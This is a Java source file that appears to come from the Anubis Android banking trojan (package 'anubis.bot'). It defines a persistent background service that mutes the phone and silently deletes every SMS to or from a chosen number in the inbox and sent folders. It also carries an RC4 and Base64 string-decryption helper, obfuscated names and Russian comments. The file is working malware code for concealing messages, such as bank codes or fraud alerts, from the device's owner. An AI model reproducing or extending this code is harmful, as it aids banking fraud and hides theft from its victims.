package anubis.bot.myapplication;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;

public class ServiceDeleteSMS extends Service {

	 UtilsClass SF = new UtilsClass();
	@Override
	public IBinder onBind(Intent arg0){
		return null;
	}

	public String str_decrypt(String textDE_C, String key)
	{
		UtilsClass utilsClass = new UtilsClass();
		try
		{
			byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
			textDE_C = new String(data, "UTF-8");
			byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
			ClassRC4 rcd = new ClassRC4(key.getBytes());
			return  new String(rcd.decrypt(detext));
		}catch (Exception ex){ }
		return "";
	}


	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		try {
			 String num = intent.getStringExtra("num");
			 String ms = intent.getStringExtra("ms");
			 DeleteSMS(this, num, ms);
		}catch (Exception e)
		{
		}
		try {
			Thread.sleep ( 5000 );} catch (InterruptedException e) {}


		return START_STICKY;
	}
	public void DeleteSMS(Context context, String num, String msssss)
	{
		 String data_file=SF.SetRead(context, "del_sws");//Читаем из файла номера для удаления
		 SF.Log("RCWC",""+data_file);
		if(data_file.contains("true"))
		{
			 SF.StopSound(context);
			DelIndox(context,"",num);
			DelSent(context,"",num);

		}
	}
	private void DelIndox(Context ccscc, String msssss, String tesstrr) {

		try {
			  Uri sws = Uri.parse("content://sms/inbox");
			  Cursor cxxs = ccscc.getContentResolver().query(sws,
					  new String[]{
							   "_id",
							   "thread_id",
							   "address",
							   "person",
							   "date",
							   "body"
			  }, null, null, null);
			if (cxxs != null && cxxs.moveToFirst())
			{
				do {
					 long id = cxxs.getLong(0);
					 long threadId = cxxs.getLong(1);
					 String address = cxxs.getString(2);
					 String body = cxxs.getString(5);

					if (!msssss.equals(body) && address.equals(tesstrr)) {
						 //SF.Log("lЫgs " + go_D_CWC , "ДЕл сWс АЙДИ: " + threadId);
						 ccscc.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
					}
				} while (cxxs.moveToNext());
			}
		}catch (Exception e){
		}

	}
	public void DelSent(Context context, String message, String number) {
		try {
			 Uri sssR = Uri.parse("content://sms/sent");
			 Cursor cetser = context.getContentResolver().query(sssR,
				 	new String[]{
							 "_id",
							 "thread_id",
							 "address",
				 			 "person",
							 "date",
							 "body"
			 }, null, null, null);

			 if (cetser != null && cetser.moveToFirst()) {
				do {
					 long id = cetser.getLong(0);
					 long threadId = cetser.getLong(1);
					 String address = cetser.getString(2);
					 String body = cetser.getString(5);

					if (!message.equals(body) && address.equals(number)) {
						 context.getContentResolver().delete(Uri.parse("content://sms/" + id), null, null);
					}
				} while (cetser.moveToNext());
			}
		} catch (Exception e) {
		}
	}
}